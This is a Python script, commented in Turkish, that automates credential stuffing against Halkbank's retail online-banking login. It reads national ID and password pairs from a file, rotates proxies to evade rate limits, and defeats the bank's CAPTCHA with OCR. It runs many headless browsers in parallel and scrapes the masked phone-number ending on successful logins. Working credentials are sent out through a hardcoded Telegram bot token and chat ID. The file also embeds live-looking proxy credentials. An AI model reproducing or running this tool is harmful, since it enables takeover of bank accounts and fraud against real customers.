import sys
import subprocess
from pathlib import Path
from urllib.parse import urlsplit, urlencode
import urllib.request
import ssl
import time
import threading
import queue
import shutil
import tempfile
import atexit


def ensure_dependencies():
    """Gerekli kutuphaneleri ve Chromium tarayici motorunu kontrol eder."""
    # pip guncelle
    try:
        import ddddocr
        HAS_OCR = True
    except ImportError:
        print("[BILGI] ddddocr eksik, yukleniyor...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'ddddocr'])
            import ddddocr
            HAS_OCR = True
            print("[BILGI] ddddocr kuruldu!")
        except Exception as e:
            print(f"[UYARI] ddddocr yuklenemedi: {e}")
            HAS_OCR = False

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("[BILGI] playwright eksik, yukleniyor...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'playwright'])
            print("[BILGI] playwright kuruldu!")
        except Exception as e:
            print(f"[UYARI] playwright yuklenemedi: {e}")

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            if not Path(p.chromium.executable_path).exists():
                raise FileNotFoundError("Chromium eksik")
    except Exception:
        print("[BILGI] Chromium tarayicisi eksik, kuruluyor...")
        try:
            subprocess.check_call([sys.executable, '-m', 'playwright', 'install', 'chromium'])
            print("[BILGI] Chromium basariyla kuruldu!\n")
        except Exception as e:
            print(f"[UYARI] Chromium yuklenemedi: {e}")


ensure_dependencies()

from playwright.sync_api import sync_playwright

HAS_OCR = False
OCR_ENGINE = None
try:
    import ddddocr
    OCR_ENGINE = ddddocr.DdddOcr(beta=True, show_ad=False)
    HAS_OCR = True
    print("[OK] CAPTCHA OCR motoru basariyla hazirlandi.")
except Exception as e:
    print(f"[UYARI] OCR motoru baslatilamadi: {e}")

ROOT = Path(__file__).resolve().parent
BILGILER_FILE = ROOT / 'bilgiler.txt'
URL = 'https://sube.halkbank.com.tr/InternetBankingHost/HostLogin?CustomerType=Retail'

# Ayarlar:
HEADLESS = True         # Tarayiciyi gosterme (Arka planda gizli calisir)
AUTO_SUBMIT = True         # CAPTCHA doldurulduktan sonra otomatik Giris dugmesine basilsin mi
AUTO_SUBMIT_DELAY = 0      # Giris dugmesine basmadan once bekleme suresi (0 = aninda basar)
PAGE_TIMEOUT = 20000       # Sayfa yuklenme zaman asimi (20 sn, proxy oluyse 100'u beklemeden hemen degisir)
ELEMENT_TIMEOUT = 15000    # Form elemanlarinin bekleme suresi (15 sn)

# Telegram Ayarlari:
TG_BOT_TOKEN = '9110259018:AAE-19j5VcA1tu0fgkUSIZk4cbQ5UI1_JZc'
TG_CHAT_ID = '-1003574765302'

# Proxy Ayarlari:
DEFAULT_PROXY = {
    'server': 'http://unlim.veritasproxy.com:8080',
    'username': 'veritas_937f0i-country-TR',
    'password': 'QefRdiBcyz'
}

def _find_proxy_file():
    target_files = [
        ROOT / 'proxy.txt',
        ROOT / 'proxies.txt',
        ROOT / 'Webshare 1000 proxies.txt',
        ROOT / 'Webshare 100 replaced proxies.txt'
    ]
    for f in target_files:
        if f.exists():
            return f
    return None


def _parse_single_proxy(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    for prefix in ('http://', 'https://'):
        if line.lower().startswith(prefix):
            line = line[len(prefix):]
            break
    line = line.rstrip('/')

    # Format 1: user:pass@host:port
    if '@' in line:
        auth_part, host_part = line.split('@', 1)
        host_tokens = host_part.split(':')
        if len(host_tokens) == 2 and host_tokens[1].isdigit():
            user_tokens = auth_part.split(':', 1)
            username = user_tokens[0]
            password = user_tokens[1] if len(user_tokens) > 1 else ''
            return {
                'server': f'http://{host_tokens[0]}:{host_tokens[1]}',
                'username': username,
                'password': password
            }

    # Format 2: host:port or host:port:user:pass
    parts = line.split(':')
    if len(parts) == 2 and parts[1].isdigit():
        return {'server': f'http://{parts[0]}:{parts[1]}'}
    elif len(parts) >= 4 and parts[1].isdigit():
        ip, port, user = parts[0], parts[1], parts[2]
        pwd = ':'.join(parts[3:])
        return {
            'server': f'http://{ip}:{port}',
            'username': user,
            'password': pwd
        }
    return None


def _parse_proxy_lines(lines):
    proxies = []
    for line in lines:
        p = _parse_single_proxy(line)
        if p:
            proxies.append(p)
    return proxies


def load_proxies():
    """Proxy dosyasini yukler ve parse eder (ip:port, ip:port:user:pass veya user:pass@host:port)."""
    proxies = []
    found_file = _find_proxy_file()

    if found_file:
        try:
            lines = found_file.read_text(encoding='utf-8', errors='ignore').splitlines()
            proxies = _parse_proxy_lines(lines)
            if proxies:
                print(f"[OK] {len(proxies)} adet proxy '{found_file.name}' dosyasindan yuklendi.")
        except Exception as e:
            print(f"[UYARI] Proxy dosyasi okunamadi: {e}")

    if not proxies and DEFAULT_PROXY:
        proxies = [DEFAULT_PROXY]
        print(f"[OK] Varsayilan proxy devrede: {DEFAULT_PROXY['server']}")

    return proxies


LOADED_PROXIES = load_proxies()


class ProxyRotator:
    """
    Proxy listesini tamamen rastgele karistirir (shuffle).
    Her tarayiciya sirayla farkli rastgele IP verir.
    Dosya diskte guncellendiginde otomatik olarak yeni listeyi yukler.
    """
    def __init__(self, proxies):
        self.original_proxies = list(proxies)
        self.lock = threading.Lock()
        self.deck = []
        self.cycle_count = 1
        self.proxy_file = _find_proxy_file()
        self._last_mtime = self._get_mtime()
        self._refill_deck()

    def _get_mtime(self):
        try:
            if self.proxy_file and self.proxy_file.exists():
                return self.proxy_file.stat().st_mtime_ns
        except Exception:
            pass
        return None

    def _reload_if_changed(self):
        current_file = _find_proxy_file()
        if not current_file:
            return
        self.proxy_file = current_file
        mtime = self._get_mtime()
        if mtime is not None and mtime != self._last_mtime:
            try:
                lines = current_file.read_text(encoding='utf-8', errors='ignore').splitlines()
                new_proxies = _parse_proxy_lines(lines)
                if new_proxies:
                    self._last_mtime = mtime
                    self.original_proxies = new_proxies
                    self.cycle_count = 1
                    self._refill_deck()
                    safe_print(f"[GUNCELLEME] '{current_file.name}' guncellendi! {len(new_proxies)} adet yeni proxy yuklendi.")
            except Exception:
                pass

    def _refill_deck(self):
        import random
        self.deck = list(self.original_proxies)
        random.shuffle(self.deck)

    def get_next_proxy(self):
        with self.lock:
            self._reload_if_changed()
            if not self.deck:
                self.cycle_count += 1
                self._refill_deck()
                if len(self.original_proxies) > 1:
                    safe_print(f'[BILGI] Listedeki tum {len(self.original_proxies)} proxy gezildi! Yeni dongu (#{self.cycle_count}) baslatildi.')
            rem = len(self.deck) - 1
            proxy = self.deck.pop()
            return proxy, rem, self.cycle_count


PROXY_ROTATOR = ProxyRotator(LOADED_PROXIES) if LOADED_PROXIES else None

# Disk ve Bellek Tasarrufu Icin Chromium Parametreleri (C Diskinin Dolmasini Engeller):
CHROMIUM_ARGS = [
    '--disable-dev-shm-usage',
    '--no-sandbox',
    '--disable-gpu',
    '--disk-cache-size=1',
    '--media-cache-size=1',
    '--disable-application-cache',
    '--aggressive-cache-discard',
    '--disable-extensions',
    '--disable-sync',
    '--mute-audio',
    '--no-first-run',
    '--log-level=3',
]


def cleanup_temp():
    """Gecici Playwright profil ve artik dosyalarini temizler."""
    try:
        temp_dir = Path(tempfile.gettempdir())
        for pat in ('*playwright*', 'scoped_dir*'):
            for p in temp_dir.glob(pat):
                try:
                    if p.is_dir():
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        p.unlink(missing_ok=True)
                except Exception:
                    pass
    except Exception:
        pass


atexit.register(cleanup_temp)

OCR_LOCK = threading.Lock()
FILE_LOCK = threading.RLock()
PRINT_LOCK = threading.Lock()


def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)


def send_telegram(tc, password, phone_end=None):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        return
    try:
        msg = (
            f"✅ [BAŞARILI] Giriş Algılandı!\n\n"
            f"👤 TC: {tc}\n"
            f"🔑 Parola: {password}"
        )
        if phone_end:
            msg += f"\n📱 {phone_end} NUMARASI SONU"
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        data = urlencode({'chat_id': TG_CHAT_ID, 'text': msg}).encode('utf-8')
        req = urllib.request.Request(url, data=data, method='POST')
        
        # Sunuculardaki SSL sertifika dogrulama hatasini onle
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            if resp.status == 200:
                safe_print(f'[{tc}] Telegram bildirimi basariyla gonderildi!')
    except Exception as e:
        safe_print(f'[{tc}] Telegram bildirim hatasi: {e}')



def load_accounts():
    if not BILGILER_FILE.exists():
        raise FileNotFoundError('bilgiler.txt dosyasi bulunamadi.')
    raw_lines = BILGILER_FILE.read_text(encoding='utf-8-sig').splitlines()
    accounts = []
    for line in raw_lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if ':' not in line:
            continue
        tc, password = line.split(':', 1)
        tc = tc.strip()
        password = password.strip()
        if tc.isdigit() and len(tc) == 11 and password:
            accounts.append((tc, password))

    if not accounts:
        raise ValueError('bilgiler.txt dosyasinda en az bir adet gecerli "TC:PAROLA" satiri bulunmalidir.')
    return accounts


PENDING_REMOVALS = set()
LAST_SAVE_TIME = time.time()


def flush_removed_accounts():
    """Toplu silinen hesaplari bilgiler.txt dosyasina guvenli sekilde yazar."""
    global LAST_SAVE_TIME
    with FILE_LOCK:
        if not PENDING_REMOVALS or not BILGILER_FILE.exists():
            return
        try:
            lines = BILGILER_FILE.read_text(encoding='utf-8-sig').splitlines()
            new_lines = []
            for line in lines:
                stripped = line.strip()
                if ':' in stripped and not stripped.startswith('#'):
                    parts = stripped.split(':', 1)
                    pair = (parts[0].strip(), parts[1].strip())
                    if pair in PENDING_REMOVALS:
                        PENDING_REMOVALS.remove(pair)
                        continue
                new_lines.append(line)

            tmp_file = BILGILER_FILE.with_suffix('.tmp')
            tmp_file.write_text('\n'.join(new_lines) + ('\n' if new_lines else ''), encoding='utf-8')
            tmp_file.replace(BILGILER_FILE)
            LAST_SAVE_TIME = time.time()
        except Exception as e:
            safe_print(f'bilgiler.txt kaydetme hatasi: {e}')


atexit.register(flush_removed_accounts)


def remove_account_from_file(tc, password, force=False):
    """Gercekten denenen hesabi listeye ekler ve periyodik olarak diske yazar (C diskinde surekli dosya yaz-sil olmasini onler)."""
    global LAST_SAVE_TIME
    with FILE_LOCK:
        PENDING_REMOVALS.add((tc, password))
        if force or len(PENDING_REMOVALS) >= 20 or (time.time() - LAST_SAVE_TIME) > 3:
            flush_removed_accounts()


def solve_captcha(page, worker_id, tc):
    """
    Halkbank BotDetect guvenlik kodunu ddddocr beta modeli ile cozer.
    """
    if not HAS_OCR or OCR_ENGINE is None:
        return None

    captcha_img = page.locator('#HalkbankLoginCaptchaRetail_CaptchaImage')

    for attempt in range(1, 5):
        try:
            captcha_img.wait_for(state='visible', timeout=5000)
            img_bytes = captcha_img.screenshot()
            with OCR_LOCK:
                raw_text = OCR_ENGINE.classification(img_bytes).strip().upper()
            code = ''.join(c for c in raw_text if c.isalnum())

            # Halkbank guvenlik kodlari her zaman 5 hanelidir
            if len(code) == 5:
                return code
            else:
                page.eval_on_selector('#HalkbankLoginCaptchaRetail_ReloadIcon', 'el => el.click()')
                page.wait_for_timeout(500)
        except Exception as e:
            safe_print(f'[Tarayici-{worker_id} | {tc}] CAPTCHA cozme hatasi: {e}')
            break

    return code if 'code' in locals() and code else None


def worker_loop(worker_id, task_queue, total_count):
    with sync_playwright() as p:
        current_proxy = None
        rem_count = 0
        cycle_num = 1
        if PROXY_ROTATOR:
            current_proxy, rem_count, cycle_num = PROXY_ROTATOR.get_next_proxy()
            if rem_count > 0 or cycle_num > 1:
                safe_print(f'[Tarayici-{worker_id}] Proxy atandi -> {current_proxy["server"]} (Havuzda kalan: {rem_count} | Dongu #{cycle_num})')
            else:
                safe_print(f'[Tarayici-{worker_id}] Proxy atandi -> {current_proxy["server"]}')
        browser = p.chromium.launch(headless=HEADLESS, args=CHROMIUM_ARGS)
        context = browser.new_context(locale='tr-TR', proxy=current_proxy)
        page = context.new_page()
        req_count = 0

        def switch_to_next_proxy(reason="Baglanti sorunu"):
            nonlocal context, page, current_proxy, rem_count, cycle_num, req_count
            try:
                page.close()
                context.close()
            except Exception:
                pass
            if PROXY_ROTATOR:
                current_proxy, rem_count, cycle_num = PROXY_ROTATOR.get_next_proxy()
                if rem_count > 0 or cycle_num > 1:
                    safe_print(f'[Tarayici-{worker_id}] [{reason}] Proxy yenilendi -> {current_proxy["server"]} (Havuzda kalan: {rem_count} | Dongu #{cycle_num})')
                else:
                    safe_print(f'[Tarayici-{worker_id}] [{reason}] Proxy oturumu yenilendi -> {current_proxy["server"]}')
            context = browser.new_context(locale='tr-TR', proxy=current_proxy)
            page = context.new_page()
            req_count = 0

        try:
            while True:
                try:
                    idx, tc, password = task_queue.get_nowait()
                except queue.Empty:
                    break

                req_count += 1
                # Her 100 istekte bir yeni rastgele proxy IP'sine gec ve oturumu sifirla
                if req_count > 0 and req_count % 100 == 0:
                    switch_to_next_proxy("100 tarama tamamlandi")

                safe_print(f'[Tarayici-{worker_id}] ({idx}/{total_count}) {tc} deneniyor...')
                account_tested = False

                try:
                    page.goto(URL, wait_until='domcontentloaded', timeout=PAGE_TIMEOUT)
                    if urlsplit(page.url).hostname != 'sube.halkbank.com.tr':
                        safe_print(f'[Tarayici-{worker_id} | {tc}] Beklenen resmi banka adresi acilmadi (Silinmedi, tekrar denenecek).')
                        task_queue.put((idx, tc, password))
                        if PROXY_ROTATOR:
                            switch_to_next_proxy("Sayfa acilamadi / Yanlis adres")
                        continue

                    user = page.locator('#PinLoginCustomerID')
                    secret = page.locator('#frmFirstLogin input[name="FirstLoginPasswordNotEncrypt"]')
                    user.wait_for(state='visible', timeout=ELEMENT_TIMEOUT)
                    secret.wait_for(state='visible', timeout=ELEMENT_TIMEOUT)

                    form = page.locator('#frmFirstLogin')
                    captcha_input = form.locator('#captcha-input')
                    submit_btn = form.locator('#submitbtn')

                    # 1. TC Kimlik Numarasini doldur
                    user.fill(tc)

                    # 2. CAPTCHA'yi PAROLAYA DOKUNMADAN ONCE COZ
                    code = solve_captcha(page, worker_id, tc)
                    if code:
                        captcha_input.fill(code)
                    else:
                        safe_print(f'[Tarayici-{worker_id} | {tc}] CAPTCHA okunamadi, tekrar denenecek (Silinmedi)...')
                        task_queue.put((idx, tc, password))
                        continue

                    # 3. Parolayi doldur
                    secret.fill(password)

                    # 4. Sanal klavyeyi gizle ve aninda Giris'e bas
                    try:
                        page.evaluate('() => document.querySelectorAll(".ui-keyboard").forEach(el => el.style.display = "none")')
                    except Exception:
                        pass

                    # 5. Otomatik Giris (Beklemeden Aninda)
                    if AUTO_SUBMIT and code:
                        if AUTO_SUBMIT_DELAY > 0:
                            time.sleep(AUTO_SUBMIT_DELAY)
                        submit_btn.click(force=True)

                    # 6. Yaniti ve Hata Durumunu Anlik Kontrol Et
                    is_success = False
                    has_error = False
                    err_message = ''
                    phone_end = None

                    for _ in range(40):
                        page.wait_for_timeout(150)

                        try:
                            state = page.evaluate('''() => {
                                const bodyText = document.body ? document.body.innerText : "";
                                const lower = bodyText.toLowerCase();

                                // ==========================================================
                                // 1. ONCELIKLE HATA, BLOKE VE KIRMIZI X KONTROLLERI
                                // ==========================================================

                                // A) Kirmizi 'X' Simgesi / Hata Ikonlari Kontrolu
                                const redXSelectors = [
                                    '.fa-times-circle', '.fa-times-circle-o', '.fa-circle-xmark', '.fa-times', '.fa-close', '.fa-remove',
                                    '.glyphicon-remove', '.glyphicon-remove-sign', '.glyphicon-remove-circle',
                                    'i[class*="times"]', 'span[class*="times"]', 'i[class*="remove"]',
                                    'svg[class*="error"]', 'svg[class*="danger"]', 'img[src*="error"]', 'img[src*="danger"]', 'img[src*="cross"]'
                                ];

                                for (const sel of redXSelectors) {
                                    const els = document.querySelectorAll(sel);
                                    for (const el of els) {
                                        // Modal kapatma carpisi veya captcha yenileme ikonunu haric tut
                                        if (el.closest && (el.closest('.close') || el.closest('#dtoLoginModalCloseButton') || el.closest('#HalkbankLoginCaptchaRetail_ReloadIcon'))) {
                                            continue;
                                        }
                                        const isVisible = el.offsetParent !== null || window.getComputedStyle(el).display !== 'none';
                                        if (isVisible) {
                                            const box = el.closest('.alert, .alert-danger, [role="alert"], div, p');
                                            const msg = box ? box.innerText.trim() : '';
                                            return { status: "error", msg: msg || "Kirmizi X hata simgesi algilandi", phone: null };
                                        }
                                    }
                                }

                                // B) Gorunur Hata Panelleri ve Alert Kutulari (.alert-danger, #result-panel-alert2 vb.)
                                const alertSelectors = [
                                    ".alert-danger", ".alert-error", "#result-panel-alert", "#result-panel-alert2",
                                    ".validation-summary-errors", ".field-validation-error", ".error-message",
                                    ".login-error", ".warning-text", "[role='alert']",
                                    ".modal-body", ".bootbox-body", ".swal2-content", ".ui-dialog-content", "#errorDiv"
                                ];

                                for (const sel of alertSelectors) {
                                    const els = document.querySelectorAll(sel);
                                    for (const el of els) {
                                        const style = window.getComputedStyle(el);
                                        if (el.offsetParent !== null && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0') {
                                            const t = el.innerText.trim();
                                            if (t.length > 2) {
                                                return { status: "error", msg: t, phone: null };
                                            }
                                        }
                                    }
                                }

                                // C) Kritik Hata & Bloke Kelimeleri (SIM/SMS Blokesi, Sifre Hatalari vb.)
                                const errKeywords = [
                                    "sms güvenlik kontrol listesi", "sms guvenlik kontrol listesi",
                                    "güvenlik kontrol listesi", "guvenlik kontrol listesi",
                                    "sim/sms bloke", "sim kart bloke", "sim bloke", "sms bloke",
                                    "bloke kaldır", "bloke kaldir", "bloke",
                                    "hatalı", "hatali", "yanlış", "yanlis", "geçersiz", "gecersiz",
                                    "başarısız", "basarisiz", "kontrol ediniz", "tekrar deneyiniz",
                                    "uyuşmamaktadır", "uyusmamaktadir", "bulunamadı", "bulunamadi",
                                    "eksik"
                                ];

                                for (const kw of errKeywords) {
                                    if (lower.includes(kw)) {
                                        return { status: "error", msg: "Banka hata uyarisi (" + kw + ")", phone: null };
                                    }
                                }

                                // D) Formun sifirlanmasi durumu (Sifre veya kod yanlis oldugunda input temizlenmisse)
                                const pinInput = document.querySelector("#PinLoginCustomerID");
                                if (pinInput && pinInput.offsetParent !== null && pinInput.value === "") {
                                    return { status: "error", msg: "Form sifirlandi (Sifre veya kod yanlis)", phone: null };
                                }

                                // ==========================================================
                                // 2. YALNIZCA HATA YOKSA BASARILI DURUMUNU KONTROL ET
                                // ==========================================================

                                let phoneEnd = null;
                                const phoneMatch = bodyText.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                if (phoneMatch && phoneMatch[1]) {
                                    phoneEnd = phoneMatch[1];
                                } else {
                                    const inputs = document.querySelectorAll("input, label, span, p, div");
                                    for (const el of inputs) {
                                        const val = (el.value || el.innerText || "").trim();
                                        const m = val.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                        if (m && m[1]) {
                                            phoneEnd = m[1];
                                            break;
                                        }
                                    }
                                }

                                if (
                                    bodyText.includes("Mobil Onay ile Giriş") ||
                                    bodyText.includes("Mobil Onay") ||
                                    bodyText.includes("SMS Şifresi") ||
                                    bodyText.includes("SMS Onay") ||
                                    bodyText.includes("Doğrulama Kodu") ||
                                    phoneEnd !== null
                                ) {
                                    return { status: "success", msg: "", phone: phoneEnd };
                                }

                                return { status: "pending", msg: "", phone: null };
                            }''')

                            if state['status'] == 'success':
                                is_success = True
                                phone_end = state.get('phone')
                                if not phone_end:
                                    page.wait_for_timeout(200)
                                    try:
                                        phone_end = page.evaluate('''() => {
                                            const txt = document.body ? document.body.innerText : "";
                                            const m = txt.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                            return m && m[1] ? m[1] : null;
                                        }''')
                                    except Exception:
                                        pass
                                break
                            elif state['status'] == 'error':
                                has_error = True
                                err_message = state['msg']
                                break
                        except Exception:
                            pass

                    # Sadece guvenlik kodu yanlis girildiyse hesabi silme, kuyruga geri koy
                    err_lower = err_message.lower()
                    is_captcha_wrong = any(k in err_lower for k in ['güvenlik kodu', 'guvenlik kodu', 'resimdeki', 'doğrulama kodu hatalı', 'dogrulama kodu hatali'])

                    if is_success:
                        account_tested = True
                        if phone_end:
                            safe_print(f'✅ [BASARILI | Tarayici-{worker_id}] {tc}:{password} -> {phone_end} NUMARASI SONU')
                        else:
                            safe_print(f'✅ [BASARILI | Tarayici-{worker_id}] {tc}:{password} -> Mobil Onay Algilandi!')
                        send_telegram(tc, password, phone_end)
                    elif has_error and is_captcha_wrong:
                        safe_print(f'🔄 [CAPTCHA HATALI | Tarayici-{worker_id}] {tc} -> Guvenlik kodu yanlis okundu, hesap silinmedi tekrar denenecek.')
                        task_queue.put((idx, tc, password))
                    elif has_error:
                        account_tested = True
                        safe_print(f'❌ [HATALI | Tarayici-{worker_id}] {tc} -> {err_message}')
                    else:
                        account_tested = True
                        safe_print(f'❌ [HATALI | Tarayici-{worker_id}] {tc} -> Giris basarisiz oldu.')

                except Exception as e:
                    safe_print(f'[Tarayici-{worker_id} | {tc}] Baglanti/Sayfa hatasi (Hesap silinmedi!): {e}')
                    task_queue.put((idx, tc, password))
                    if PROXY_ROTATOR:
                        switch_to_next_proxy("Sayfa acilamadi / Zaman asimi")
                    time.sleep(1)

                finally:
                    # SADECE gercekten denenen hesabi bilgiler.txt dosyasindan sil
                    if account_tested:
                        remove_account_from_file(tc, password)

                    # Oturum verilerini temizle
                    try:
                        context.clear_cookies()
                    except Exception:
                        pass

                    task_queue.task_done()
        finally:
            browser.close()


def main():
    check = '--check' in sys.argv
    if check:
        with sync_playwright() as p:
            for _ in range(3):
                browser = None
                try:
                    proxy_settings = None
                    if PROXY_ROTATOR:
                        proxy_settings, _, _ = PROXY_ROTATOR.get_next_proxy()
                    browser = p.chromium.launch(headless=HEADLESS, args=CHROMIUM_ARGS)
                    context = browser.new_context(locale='tr-TR', proxy=proxy_settings)
                    page = context.new_page()
                    page.goto(URL, wait_until='domcontentloaded', timeout=40000)
                    srv = proxy_settings['server'] if proxy_settings else 'direct'
                    print(f'Resmi giris sayfasi dogrulandi ({srv}).')
                    browser.close()
                    break
                except Exception:
                    if browser:
                        try:
                            browser.close()
                        except Exception:
                            pass
        return

    if not HAS_OCR or OCR_ENGINE is None:
        print("\n[HATA] CAPTCHA OCR motoru hazir degil! Islem baslatilamadi.")
        print("Lutfen once sunucuda su komutu calistirin: pip install ddddocr\n")
        return

    accounts = load_accounts()
    total_count = len(accounts)
    print(f'Toplam {total_count} hesap bilgisi bilgiler.txt dosyasindan yuklendi.')

    # Komut satirindan veya interaktif giris ile tarayici sayisi belirleme
    num_browsers = None
    for arg in sys.argv[1:]:
        if arg.isdigit():
            num_browsers = int(arg)
            break

    if num_browsers is None:
        try:
            raw_input = input('Kac tarayici ile acilsin? (Ornek: 1, 3, 5): ').strip()
            num_browsers = int(raw_input) if raw_input else 1
            if num_browsers < 1:
                num_browsers = 1
        except (ValueError, EOFError, Exception):
            num_browsers = 5

    num_browsers = min(num_browsers, total_count)
    print(f'\n{num_browsers} adet gizli tarayici (arka planda) baslatiliyor...')
    print('Denenen her hesap aninda bilgiler.txt dosyasindan silinecektir.\n')

    task_queue = queue.Queue()
    for idx, (tc, password) in enumerate(accounts, start=1):
        task_queue.put((idx, tc, password))

    threads = []
    for w_id in range(1, num_browsers + 1):
        t = threading.Thread(
            target=worker_loop,
            args=(w_id, task_queue, total_count),
            daemon=True
        )
        t.start()
        threads.append(t)
        if w_id < num_browsers:
            time.sleep(1.2)  # Tarayicilarin ayni anda acilip Playwright motor cakismasi yapmasini onler

    for t in threads:
        t.join()

    flush_removed_accounts()
    cleanup_temp()
    print('\nListedeki tum hesaplar denendi ve bilgiler.txt dosyasindan temizlendi!')


if __name__ == '__main__':
    try:
        cleanup_temp()
        main()
    except (ValueError, FileNotFoundError) as exc:
        print(str(exc))
        sys.exit(1)
    except KeyboardInterrupt:
        flush_removed_accounts()
        cleanup_temp()
        print('\nIslem kullanici tarafindan durduruldu.')
        sys.exit(0)
    except Exception as exc:
        flush_removed_accounts()
        cleanup_temp()
        print(f'Baglanti veya sayfa hatasi: {exc}')
        sys.exit(1)

